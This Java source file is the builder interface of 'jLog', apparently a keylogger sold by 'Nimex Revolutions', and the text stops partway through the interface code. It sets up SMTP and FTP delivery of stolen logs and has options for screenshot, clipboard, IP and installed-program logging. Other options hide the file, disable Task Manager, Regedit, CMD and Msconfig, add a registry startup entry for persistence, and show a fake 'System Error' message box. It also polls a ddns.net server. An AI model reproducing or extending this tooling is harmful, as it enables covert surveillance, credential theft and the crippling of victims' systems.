package com.Nimex;

import java.awt.Component;
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Font;

import javax.crypto.*;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTabbedPane;

import com.Nimex.Functions.Base64Utils;
import com.Nimex.Functions.DES;
import com.Nimex.Functions.FTP;
import com.Nimex.Functions.OneInstance;
import com.Nimex.Functions.SMTP;
import com.sun.glass.events.KeyEvent;
import javax.swing.JComponent;

import java.awt.Toolkit;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;

import javax.swing.JRadioButton;
import javax.swing.JPanel;
import javax.swing.border.LineBorder;
import java.awt.Color;
import org.eclipse.wb.swing.FocusTraversalOnArray;
import javax.swing.ImageIcon;
import javax.swing.BorderFactory;
import javax.swing.ButtonGroup;
import javax.swing.UIManager;

import java.util.Base64;
import java.util.Calendar;
import java.util.Random;
import javax.swing.JButton;
import javax.swing.AbstractAction;
import java.awt.event.ActionEvent;
import javax.swing.Action;
import javax.swing.SwingConstants;
import javax.swing.border.TitledBorder;
import javax.swing.JSeparator;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.JSpinner;
import javax.swing.JOptionPane;
import javax.swing.JComboBox;
import javax.swing.DefaultComboBoxModel;
import javax.swing.DefaultListModel;
import javax.swing.SpinnerNumberModel;
import javax.swing.JCheckBox;
import java.awt.SystemColor;
import java.awt.event.ActionListener;
import javax.swing.JEditorPane;
import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.awt.event.ItemListener;
import java.awt.event.ItemEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;

import javax.swing.JList;
import javax.swing.JScrollPane;
import javax.swing.ScrollPaneConstants;

public class Nimex_Form extends JFrame
{		
    @SuppressWarnings("rawtypes")
	JList list;
    private JTextField txtProcessAdd;
	private static final long serialVersionUID = 1L;
	public JFrame frmNimexRevolutions;
	private JPanel MainTabPage;
	JButton Load = new JButton();
	private ButtonGroup buttonGroup = new ButtonGroup();
	private ButtonGroup RadioButtons = new ButtonGroup();
	
	// General 
	static JLabel ServerOffOn;
	JEditorPane LogPane;
	JPanel SMTP_GroupBox = new JPanel();
	JPanel ProcessKillerPane = new JPanel();
	JCheckBox chckbxEnableSsl;
	static JPanel FTP_GroupBox = new JPanel();
	private JCheckBox Enable_ADDTOSTARTUP;
	private JCheckBox Enable_FAKEMESSAGEBOX;
	private JCheckBox ShowPassWord;
	@SuppressWarnings("rawtypes")
	private JComboBox Combobox_PATHLOCATION;
	private JRadioButton Critical_RB;
	private JRadioButton Warning_RB;
	private JRadioButton Information_RB;
	private JButton Button_TESTFAKEMESSAGEBOX;
	private JSpinner CharAmount;
	private JTextField mail;
	private static JButton btnNewButton_2;
	private JPasswordField passwordField;
	private JTextField txtRecievermailcom;
	private JTextField HOST;
	private JTextField txtFtpftpcomlogtxt;
	private JTextField txtUsername;
	private JPasswordField passwordField_1;
	private JTextField TextField_VALUEKEY;
	private JTextField TextField_TITLETEXT;
	private JTextField TextField_MESSAGEBOX;
	private JTextField MutexKey;
	private JCheckBox ToSCheckbox;
	private JButton CompileFileButton;
	private static JButton BtnNewButton_1;
	private JTextField NonencryptedString;
	private JTextField EncryptedString;
	private JTextField txtWebsiteField;
	private JCheckBox ProcessKiller;
	private JCheckBox EnableWebsiteVis;
	//
	
	// ActionEvents
	private final Action AgreeTOS = new AgreeTOS();
	private final Action EnableWebsiteVisitor = new EnableWebsiteVisitor();
	private final Action EnableAddToStartup = new EnableAddToStartup();
	private final Action EnableFakeMessageBox = new EnableFakeMessageBox();
	private final Action LOADSETTINGS = new button1();
	private final Action SMTP_RD = new SMTP_RD();
	private final Action FTP_RD = new FTP_RD();
	//

	protected Component makeTextPanel(String text) {
	    MainTabPage = new JPanel(false);
	    MainTabPage.setBorder(new LineBorder(SystemColor.desktop, 0));
	    return MainTabPage;
	}
	
	static void CheckServer()
	{
		
		try 
        {
			InetAddress host = InetAddress.getByName("nimexrevolutions.ddns.net");
            Socket socket = new Socket(host.getHostAddress(), 5678);
            PrintWriter writer = new PrintWriter(socket.getOutputStream());
            if (socket.isConnected())
            {
            	 ServerOffOn.setText("Online");
                 ServerOffOn.setForeground(Color.GREEN);
            }
            writer.print("Hello world");
            writer.flush();
            writer.close();
            socket.close();
        } 
        catch (Exception e) 
        {
        	ServerOffOn.setText("Offline");
            ServerOffOn.setForeground(Color.red);  
        }
	}
	
	public static void main(String[] args) 
	{
		try 
		{	
			Thread t = new Thread()
			{
		    public void run()
		    {
		        while (true)
		        {	        	
		        	CheckServer();	
		        	try 
		        	{
		        		CheckServer();	
						Thread.sleep(30000);
					} 
		        	catch (InterruptedException e)
		        	{				
						e.printStackTrace();
					}
		        }
		    }
			};t.start();		
			OneInstance mutex = new OneInstance();
			boolean answer = mutex.GetInstance();		
			if (answer)
			{
				// Nothing
				// JOptionPane.showMessageDialog(null, System.getProperty("java.class.path"), "Hello", JOptionPane.DEFAULT_OPTION); <-- Get full path of file.	
			}
			else
			{
				System.exit(2);
			}
			
			if (System.getProperty("os.name") == "Windows XP")
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			}			
			else if (System.getProperty("os.name") == "Windows 10")
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			}
			else if (System.getProperty("os.name") == "Windows 7")
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			}
			else if (System.getProperty("os.name") == "Windows 8")
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			}
			else if (System.getProperty("os.name") == "Windows Vista")
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
			}
			else if (System.getProperty("os.name") == "Mac OS X")
			{
				try
				{
					UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
				}
				catch (Exception er)
				{
					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());	
				}
			}
			else if (System.getProperty("os.name") == "Linux")
			{
				try
				{
					UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
				}
				catch (Exception er)
				{
					UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());	
				}
			}
			else
			{
				UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");	
				//UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
			}
		
		} 
		catch (Throwable e) 
		{
			e.printStackTrace();
		}
		EventQueue.invokeLater(new Runnable() 
		{
			public void run() 
			{
				try {
					Nimex_Form window = new Nimex_Form();
					window.frmNimexRevolutions.setVisible(true);
					Component[] com = FTP_GroupBox.getComponents();
					for (int a = 0; a < com.length; a++) 
					{
					     com[a].setEnabled(false);
					}
				} 
				catch (Exception e) 
				{
					e.printStackTrace();
				}
			}
		});	
	}
	
	public Nimex_Form() 
	{
		initialize();
	}
	
	static Font SetFont(int size)
	{
		Font UI = new Font("Segoe UI", Font.PLAIN, size);
		return UI;
	}

	@SuppressWarnings({ "rawtypes", "unchecked" })
	private void initialize() 
	{		
		// FRAME INFORMATION
		frmNimexRevolutions = new JFrame();
		frmNimexRevolutions.setForeground(Color.BLUE);
		frmNimexRevolutions.setIconImage(Toolkit.getDefaultToolkit().getImage(Nimex_Form.class.getResource("/Images/transparent.png")));
		frmNimexRevolutions.setTitle("jLog [Licensed to Marwix] - by Nimex Revolutions");
		frmNimexRevolutions.setResizable(false);
		frmNimexRevolutions.setLocationRelativeTo(null);
		frmNimexRevolutions.setFont(SetFont(11));
		frmNimexRevolutions.setBounds(100, 100, 459, 366);
		frmNimexRevolutions.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
		frmNimexRevolutions.setLocation((dim.width/2)-(frmNimexRevolutions.getSize().width/2), (dim.height/2)-(frmNimexRevolutions.getSize().height/2));
		frmNimexRevolutions.getContentPane().setLayout(null);
		//
		
		JTabbedPane Tabpage_Pages = new JTabbedPane(JTabbedPane.TOP);
		Tabpage_Pages.setFont(SetFont(11));
		Tabpage_Pages.setForeground(SystemColor.desktop);
		Tabpage_Pages.setBackground(Color.GRAY);
		Color c = Color.decode("#B24241");
		Tabpage_Pages.setForeground(c);
		Tabpage_Pages.setBorder(null);
		Tabpage_Pages.setBounds(7, 6, 440, 263);
		frmNimexRevolutions.getContentPane().add(Tabpage_Pages);

		JComponent MainTab = (JComponent) makeTextPanel("");
		Tabpage_Pages.addTab("Main", MainTab);
		Tabpage_Pages.setMnemonicAt(0, KeyEvent.VK_1);
		MainTabPage.setLayout(null);

		JRadioButton SETUP_RDB = new JRadioButton("SMTP Setup");
		SETUP_RDB.setAction(SMTP_RD);
		SETUP_RDB.setSelected(true);
		SETUP_RDB.setBounds(6, 7, 90, 23);
		SETUP_RDB.setFont(SetFont(11));
		MainTabPage.add(SETUP_RDB);
		buttonGroup.add(SETUP_RDB);
		
		JRadioButton FTP_RDB = new JRadioButton("FTP Setup");
		FTP_RDB.setAction(FTP_RD);
		FTP_RDB.setBounds(351, 7, 82, 23);
		FTP_RDB.setFont(SetFont(11));
		MainTabPage.add(FTP_RDB);
		buttonGroup.add(FTP_RDB);

		SMTP_GroupBox.setBorder(new LineBorder(new Color(0, 0, 0)));
		SMTP_GroupBox.setBounds(6, 37, 232, 195);
		SMTP_GroupBox.setBorder(BorderFactory.createTitledBorder("Email Settings"));
		SMTP_GroupBox.setLayout(null);
		SMTP_GroupBox.setVisible(true);
		SMTP_GroupBox.setFont(SetFont(11));
		MainTabPage.add(SMTP_GroupBox);
		
		JLabel Label_YOURMAIL = new JLabel("Your Email:");
		Label_YOURMAIL.setBounds(28, 39, 65, 14);
		Label_YOURMAIL.setFont(SetFont(11));
		SMTP_GroupBox.add(Label_YOURMAIL);
		
		mail = new JTextField();
		mail.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (mail.getText().equals("Your-email@mail.com"))
				{
					mail.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (mail.getText().equals(""))
				{
					mail.setText("Your-email@mail.com");
				}
				else if (mail.getText().isEmpty() == false)
				{
					return;
				}
			}
		});
		mail.setText("Your-email@mail.com");
		mail.setBounds(93, 36, 127, 20);
		mail.setFont(SetFont(11));
		SMTP_GroupBox.add(mail);
		mail.setColumns(10);
		
		JLabel Label_YOURPASSWORD = new JLabel("Your Password:");
		Label_YOURPASSWORD.setBounds(7, 63, 83, 14);
		Label_YOURPASSWORD.setFont(SetFont(11));
		SMTP_GroupBox.add(Label_YOURPASSWORD);
		
		passwordField = new JPasswordField();
		passwordField.setEchoChar('*');
		passwordField.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(passwordField.getPassword()).equals("Password"))
				{
					passwordField.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(passwordField.getPassword()).equals(""))
				{
					passwordField.setText("Password");
				}
				else if (String.valueOf(passwordField.getPassword()).isEmpty() == false)
				{
					return;
				}
			}
		});
		passwordField.setBounds(93, 60, 127, 20);
		passwordField.setText("Password");
		passwordField.setFont(SetFont(11));
		SMTP_GroupBox.add(passwordField);
		
		JLabel Label_RECIEVERMAIL = new JLabel("Reciever Email:");
		Label_RECIEVERMAIL.setBounds(10, 87, 75, 14);
		Label_RECIEVERMAIL.setFont(SetFont(11));
		SMTP_GroupBox.add(Label_RECIEVERMAIL);
		
		txtRecievermailcom = new JTextField();
		txtRecievermailcom.setText("Reciever@mail.com");
		txtRecievermailcom.setBounds(93, 84, 127, 20);
		txtRecievermailcom.setFont(SetFont(11));
		txtRecievermailcom.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(txtRecievermailcom.getText()).equals("Reciever@mail.com"))
				{
					txtRecievermailcom.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(txtRecievermailcom.getText()).equals(""))
				{
					txtRecievermailcom.setText("Reciever@mail.com");
				}
				else if (String.valueOf(txtRecievermailcom.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		SMTP_GroupBox.add(txtRecievermailcom);
		txtRecievermailcom.setColumns(10);
		
		JLabel Label_SMTPADDRESS = new JLabel("SMTP Address:");
		Label_SMTPADDRESS.setBounds(10, 111, 75, 14);
		Label_SMTPADDRESS.setFont(SetFont(11));
		SMTP_GroupBox.add(Label_SMTPADDRESS);
		
		HOST = new JTextField();
		HOST.setText("smtp.xx.com");
		HOST.setBounds(93, 108, 69, 20);
		HOST.setFont(SetFont(11));
		HOST.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(HOST.getText()).equals("smtp.xx.com"))
				{
					HOST.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(HOST.getText()).equals(""))
				{
					HOST.setText("smtp.xx.com");
				}
				else if (String.valueOf(HOST.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		SMTP_GroupBox.add(HOST);
		HOST.setColumns(10);
		
		JComboBox comboBox = new JComboBox();
		comboBox.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent arg0) 
			{
				if (comboBox.getSelectedItem() == "Hotmail")
				{
					HOST.setEnabled(false);
					chckbxEnableSsl.setEnabled(false);
				}
				else if (comboBox.getSelectedItem() == "Yahoo")
				{
					HOST.setEnabled(false);
					chckbxEnableSsl.setEnabled(false);
				}
				else if (comboBox.getSelectedItem() == "Gmail")
				{
					HOST.setEnabled(false);
					chckbxEnableSsl.setEnabled(false);
				}
				else
				{
					HOST.setEnabled(true);
					chckbxEnableSsl.setEnabled(true);
				}
			}
		});
		comboBox.setModel(new DefaultComboBoxModel(new String[] {"...", "Hotmail", "Gmail", "Yahoo"}));
		comboBox.setSelectedIndex(0);
		comboBox.setBounds(160, 108, 60, 20);
		SMTP_GroupBox.add(comboBox);
		
		JLabel Label_PORTNUMBER = new JLabel("Port Number:");
		Label_PORTNUMBER.setBounds(17, 134, 69, 14);
		Label_PORTNUMBER.setFont(SetFont(11));
		SMTP_GroupBox.add(Label_PORTNUMBER);
		
		JSpinner spinner = new JSpinner();
		spinner.setModel(new SpinnerNumberModel(587, 1, 25565, 1));
		spinner.setBounds(93, 132, 53, 20);
		spinner.setFont(SetFont(11));
		SMTP_GroupBox.add(spinner);
		
		ShowPassWord = new JCheckBox("Show Password");
		ShowPassWord.addItemListener(new ItemListener() {
			public void itemStateChanged(ItemEvent arg0) 
			{
				if (ShowPassWord.isSelected())
				{		
					passwordField.setEchoChar((char) 0);
					passwordField_1.setEchoChar((char) 0);
				}
				else
				{
					char j = '*';
					passwordField.setEchoChar(j);
					passwordField_1.setEchoChar(j);
				}
			}
		});
		ShowPassWord.setBounds(90, 11, 112, 23);
		ShowPassWord.setFont(SetFont(11));
		SMTP_GroupBox.add(ShowPassWord);
		
		chckbxEnableSsl = new JCheckBox("SSL");
		chckbxEnableSsl.setSelected(true);
		chckbxEnableSsl.setHorizontalAlignment(SwingConstants.RIGHT);
		chckbxEnableSsl.setBounds(167, 133, 53, 21);
		chckbxEnableSsl.setFont(SetFont(11));
		SMTP_GroupBox.add(chckbxEnableSsl);
		
		BtnNewButton_1 = new JButton("Send Test Mail ");
		BtnNewButton_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				try
				{
					String[] infoCredentials = new String[10];
					infoCredentials[0] = mail.getText(); // Mail
					infoCredentials[1] = String.valueOf(passwordField.getPassword()); // Password
					infoCredentials[2] = txtRecievermailcom.getText(); // Reciever Mail
					if (comboBox.getSelectedItem() == "...")
					{ 
						infoCredentials[3] = HOST.getText(); // Host
					}
					else
					{			
						int value = comboBox.getSelectedIndex();
						switch (value)
						{
						case 1: infoCredentials[3] = "smtp.live.com";
						break;
						
						case 2: infoCredentials[3] = "smtp.gmail.com";
						break;
						
						case 3: infoCredentials[3] = "smtp.mail.yahoo.com";
						break;
						}
					}				
					infoCredentials[4] = String.valueOf(spinner.getValue()); // Port
					if (chckbxEnableSsl.isSelected()) // SSL
					{
						infoCredentials[5] = "true";
					}
					else
					{
						infoCredentials[5] = "false";
					}
					
					BtnNewButton_1.setText("Preparing settings...");
					Thread Mail_Send = new Thread() {
						    public void run() {					 
					        SMTP process = new SMTP();
							process.SendMail(infoCredentials[2], infoCredentials[0], infoCredentials[0], infoCredentials[1], infoCredentials[3], String.valueOf(infoCredentials[4]), infoCredentials[5]);
					    }
							};
					Mail_Send.start();
				}
				catch (Exception er) 
				{
					System.out.println(er.toString());
					BtnNewButton_1.setText("Send Test Mail");
				}
			}
		});
		BtnNewButton_1.setForeground(new Color(0, 0, 0));
		BtnNewButton_1.setBounds(10, 157, 210, 30);
		BtnNewButton_1.setFont(SetFont(11));
		SMTP_GroupBox.add(BtnNewButton_1);

		FTP_GroupBox.setBounds(248, 37, 179, 132);
		FTP_GroupBox.setLayout(null);
		FTP_GroupBox.setBorder(new TitledBorder(null, "FTP Settings", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		FTP_GroupBox.setFont(SetFont(11));
		MainTabPage.add(FTP_GroupBox);
		
		JLabel lblHostname = new JLabel("Hostname:");
		lblHostname.setBounds(14, 23, 60, 14);
		lblHostname.setFont(SetFont(11));
		FTP_GroupBox.add(lblHostname);
		
		txtFtpftpcomlogtxt = new JTextField();
		txtFtpftpcomlogtxt.setText("ftp://ftp.com");
		txtFtpftpcomlogtxt.setToolTipText("");
		txtFtpftpcomlogtxt.setBounds(77, 21, 92, 20);
		txtFtpftpcomlogtxt.setFont(SetFont(11));
		txtFtpftpcomlogtxt.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(txtFtpftpcomlogtxt.getText()).equals("ftp://ftp.com"))
				{
					txtFtpftpcomlogtxt.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(txtFtpftpcomlogtxt.getText()).equals(""))
				{
					txtFtpftpcomlogtxt.setText("ftp://ftp.com");
				}
				else if (String.valueOf(txtFtpftpcomlogtxt.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		FTP_GroupBox.add(txtFtpftpcomlogtxt);
		txtFtpftpcomlogtxt.setColumns(10);
		
		txtUsername = new JTextField();
		txtUsername.setText("Username");
		txtUsername.setBounds(77, 46, 92, 20);
		txtUsername.setFont(SetFont(11));
		txtUsername.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(txtUsername.getText()).equals("Username"))
				{
					txtUsername.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(txtUsername.getText()).equals(""))
				{
					txtUsername.setText("Username");
				}
				else if (String.valueOf(txtUsername.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		FTP_GroupBox.add(txtUsername);
		txtUsername.setColumns(10);
		
		JLabel lblNewLabel = new JLabel("Username:");
		lblNewLabel.setBounds(15, 48, 60, 14);
		lblNewLabel.setFont(SetFont(11));
		FTP_GroupBox.add(lblNewLabel);
		
		JLabel lblPassword = new JLabel("Password:");
		lblPassword.setBounds(17, 73, 52, 15);
		lblPassword.setFont(SetFont(11));
		FTP_GroupBox.add(lblPassword);
		
		passwordField_1 = new JPasswordField();
		passwordField_1.setEchoChar('*');
		passwordField_1.setBounds(77, 71, 92, 20);
		passwordField_1.setText("Password");
		passwordField_1.setFont(SetFont(11));
		passwordField_1.addFocusListener(new FocusAdapter() {
			@Override
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(passwordField_1.getPassword()).equals("Password"))
				{
					passwordField_1.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(passwordField_1.getPassword()).equals(""))
				{
					passwordField_1.setText("Password");
				}
				else if (String.valueOf(passwordField_1.getPassword()).isEmpty() == false)
				{
					return;
				}
			}
		});
		FTP_GroupBox.add(passwordField_1);
		
		btnNewButton_2 = new JButton("Send Test File");
		btnNewButton_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				try
				{
					String[] values = new String[] {txtFtpftpcomlogtxt.getText(), txtUsername.getText(), String.valueOf(passwordField_1.getPassword()) };

					Thread FTP_Send = new Thread() {
					    public void run() {					 
				        FTP process = new FTP();
						process.SendFTP(values[0], values[1], values[2]);
				    }
						};
					FTP_Send.start();
				}
				catch (Exception er) 
				{
					System.out.println(er.toString());
				}
			}
		});
		btnNewButton_2.setBounds(10, 99, 159, 23);
		btnNewButton_2.setFont(SetFont(11));
		FTP_GroupBox.add(btnNewButton_2);
		
		JSeparator separator = new JSeparator();
		separator.setBounds(99, 18, 243, 12);
		separator.setFont(SetFont(11));
		MainTabPage.add(separator);
		
		JPanel panel = new JPanel();
		panel.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Information", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 0, 0)));
		panel.setBounds(248, 176, 179, 56);
		MainTabPage.add(panel);
		panel.setLayout(null);

		JButton LoadSettings = new JButton("Load Settings");
		LoadSettings.setBounds(9, 20, 103, 25);
		LoadSettings.setFont(SetFont(11));
		panel.add(LoadSettings);
		LoadSettings.setAction(LOADSETTINGS);
		
		JButton btnNewButton = new JButton("News");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) 
			{
				// Connect to database and grab update.log
				// Will be fixed once our website is up.
			}
		});
		btnNewButton.setBounds(108, 20, 61, 25);
		btnNewButton.setFont(SetFont(11));
		panel.add(btnNewButton);

		JPanel SettingsTabPage = new JPanel();
		SettingsTabPage.setBorder(new LineBorder(new Color(0, 0, 0), 0));
		Tabpage_Pages.addTab("Settings", null, SettingsTabPage, null);
		SettingsTabPage.setLayout(null);
		
		JPanel SettingsPane = new JPanel();
		SettingsPane.setBorder(new TitledBorder(null, "Keylogger Settings", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		SettingsPane.setBounds(6, 11, 170, 221);
		SettingsTabPage.add(SettingsPane);
		SettingsPane.setFont(SetFont(11));
		SettingsPane.setLayout(null);
		
		JCheckBox Enable_IPLOGGER = new JCheckBox("IP Logger");
		Enable_IPLOGGER.setBounds(20, 28, 85, 23);
		Enable_IPLOGGER.setFont(SetFont(11));
		SettingsPane.add(Enable_IPLOGGER);
		
		JCheckBox Enable_SCREENSHOTLOGGER = new JCheckBox("Screenshot Logger");
		Enable_SCREENSHOTLOGGER.setBounds(20, 54, 135, 23);
		Enable_SCREENSHOTLOGGER.setFont(SetFont(11));
		SettingsPane.add(Enable_SCREENSHOTLOGGER);
		
		JCheckBox Enable_LIP = new JCheckBox("Log Installed Programs");
		Enable_LIP.setBounds(20, 80, 145, 23);
		Enable_LIP.setFont(SetFont(11));
		SettingsPane.add(Enable_LIP);
		
		JCheckBox Enable_CLIPBOARDLOGGER = new JCheckBox("Clipboard Logger");
		Enable_CLIPBOARDLOGGER.setBounds(20, 106, 115, 23);
		Enable_CLIPBOARDLOGGER.setFont(SetFont(11));
		SettingsPane.add(Enable_CLIPBOARDLOGGER);
		
		JCheckBox Enable_HIDEFILE = new JCheckBox("Hide File");
		Enable_HIDEFILE.setBounds(20, 132, 85, 23);
		Enable_HIDEFILE.setFont(SetFont(11));
		SettingsPane.add(Enable_HIDEFILE);
		
		JLabel Label_SENDLOGSEACH = new JLabel("Send Logs Each");
		Label_SENDLOGSEACH.setBounds(23, 164, 85, 14);
		Label_SENDLOGSEACH.setFont(SetFont(11));
		SettingsPane.add(Label_SENDLOGSEACH);
		
		JSpinner NumericUpDown_INTERVAL = new JSpinner();
		NumericUpDown_INTERVAL.setModel(new SpinnerNumberModel(5, 1, 100, 1));
		NumericUpDown_INTERVAL.setBounds(66, 182, 38, 20);
		NumericUpDown_INTERVAL.setFont(SetFont(11));
		NumericUpDown_INTERVAL.setEditor(new JSpinner.DefaultEditor(NumericUpDown_INTERVAL));
		SettingsPane.add(NumericUpDown_INTERVAL);
		
		JLabel Label_MINUTES = new JLabel("Minutes.");
		Label_MINUTES.setBounds(109, 185, 46, 14);
		Label_MINUTES.setFont(SetFont(11));
		SettingsPane.add(Label_MINUTES);
		
		JPanel DisablersPane = new JPanel();
		DisablersPane.setBorder(new TitledBorder(null, "Disablers (Windows)", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		DisablersPane.setBounds(186, 11, 241, 92);
		DisablersPane.setFont(SetFont(11));
		SettingsTabPage.add(DisablersPane);
		DisablersPane.setLayout(null);
		
		JCheckBox Enable_CMD = new JCheckBox("Disable CMD");
		Enable_CMD.setBounds(10, 25, 97, 23);
		Enable_CMD.setFont(SetFont(11));
		DisablersPane.add(Enable_CMD);
		
		JCheckBox Enable_MSCONFIG = new JCheckBox("Disable Msconfig");
		Enable_MSCONFIG.setBounds(10, 51, 115, 23);
		Enable_MSCONFIG.setFont(SetFont(11));
		DisablersPane.add(Enable_MSCONFIG);
		
		JCheckBox Enable_REGEDIT = new JCheckBox("Disable Regedit");
		Enable_REGEDIT.setBounds(125, 25, 109, 23);
		Enable_REGEDIT.setFont(SetFont(11));
		DisablersPane.add(Enable_REGEDIT);
		
		JCheckBox Enable_TASKMGR = new JCheckBox("Disable Taskmgr");
		Enable_TASKMGR.setBounds(125, 51, 109, 23);
		Enable_TASKMGR.setFont(SetFont(11));
		DisablersPane.add(Enable_TASKMGR);
		
		JPanel AddToStartupPane = new JPanel();
		AddToStartupPane.setBorder(new TitledBorder(null, "Add-to-Startup (Windows)", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		AddToStartupPane.setBounds(186, 114, 241, 118);
		AddToStartupPane.setFont(SetFont(11));
		SettingsTabPage.add(AddToStartupPane);
		AddToStartupPane.setLayout(null);
		
		Enable_ADDTOSTARTUP = new JCheckBox("Enable");
		Enable_ADDTOSTARTUP.setAction(EnableAddToStartup);
		Enable_ADDTOSTARTUP.setBounds(174, 10, 61, 23);
		Enable_ADDTOSTARTUP.setFont(SetFont(11));
		AddToStartupPane.add(Enable_ADDTOSTARTUP);
		
		JLabel Label_REGISTRYVALUENAME = new JLabel("Registry Value name:");
		Label_REGISTRYVALUENAME.setBounds(16, 50, 107, 14);
		Label_REGISTRYVALUENAME.setFont(SetFont(11));
		AddToStartupPane.add(Label_REGISTRYVALUENAME);
		
		TextField_VALUEKEY = new JTextField();
		TextField_VALUEKEY.setEnabled(false);
		TextField_VALUEKEY.setText("My_Key");
		TextField_VALUEKEY.setBounds(132, 48, 92, 20);
		TextField_VALUEKEY.setFont(SetFont(11));
		TextField_VALUEKEY.addFocusListener(new FocusAdapter() {
			public void focusGained(FocusEvent arg0) 
			{
				if (String.valueOf(TextField_VALUEKEY.getText()).equals("My_Key"))
				{
					TextField_VALUEKEY.setText("");
				}
				else
				{
					return;
				}
				
			}
			@Override
			public void focusLost(FocusEvent e) 
			{
				if (String.valueOf(TextField_VALUEKEY.getText()).equals(""))
				{
					TextField_VALUEKEY.setText("My_Key");
				}
				else if (String.valueOf(TextField_VALUEKEY.getText()).isEmpty() == false)
				{
					return;
				}
			}
		});
		AddToStartupPane.add(TextField_VALUEKEY);
		TextField_VALUEKEY.setColumns(10);
		
		Combobox_PATHLOCATION = new JComboBox();
		Combobox_PATHLOCATION.setEnabled(false);
		Combobox_PATHLOCATION.setModel(new DefaultComboBoxModel(new String[] {"AppData", "Temp", "ProgramFiles", "System", "Startup", "MyDocuments"}));
		Combobox_PATHLOCATION.setBounds(132, 79, 92, 20);
		Combobox_PATHLOCATION.setFont(SetFont(11));
		AddToStartupPane.add(Combobox_PATHLOCATION);
		
		JLabel Label_PATHLOCATION = new JLabel("Path Location:");
		Label_PATHLOCATION.setBounds(50, 81, 73, 14);
		Label_PATHLOCATION.setFont(SetFont(11));
		AddToStartupPane.add(Label_PATHLOCATION);
		
		JPanel FileAssemblyPage = new JPanel();
		FileAssemblyPage.setBorder(new LineBorder(new Color(0, 0, 0), 0));
		Tabpage_Pages.addTab("Misc | Messagebox", null, FileAssemblyPage, null);
		FileAssemblyPage.setLayout(null);
		
		JPanel FakeMessageBoxPane = new JPanel();
		FakeMessageBoxPane.setBorder(new TitledBorder(null, "Fake Messagebox", TitledBorder.LEADING, TitledBorder.TOP, null, null));
		FakeMessageBoxPane.setBounds(229, 11, 198, 221);
		FileAssemblyPage.add(FakeMessageBoxPane);
		FakeMessageBoxPane.setLayout(null);
		
		Enable_FAKEMESSAGEBOX = new JCheckBox("Enable");
		Enable_FAKEMESSAGEBOX.setAction(EnableFakeMessageBox);
		Enable_FAKEMESSAGEBOX.setBounds(128, 10, 65, 23);
		Enable_FAKEMESSAGEBOX.setFont(SetFont(11));
		FakeMessageBoxPane.add(Enable_FAKEMESSAGEBOX);
		
		JLabel Label_TITLE = new JLabel("Title:");
		Label_TITLE.setBounds(34, 46, 29, 14);
		Label_TITLE.setFont(SetFont(11));
		FakeMessageBoxPane.add(Label_TITLE);
		
		TextField_TITLETEXT = new JTextField();
		TextField_TITLETEXT.setEnabled(false);
		TextField_TITLETEXT.setText("System Error");
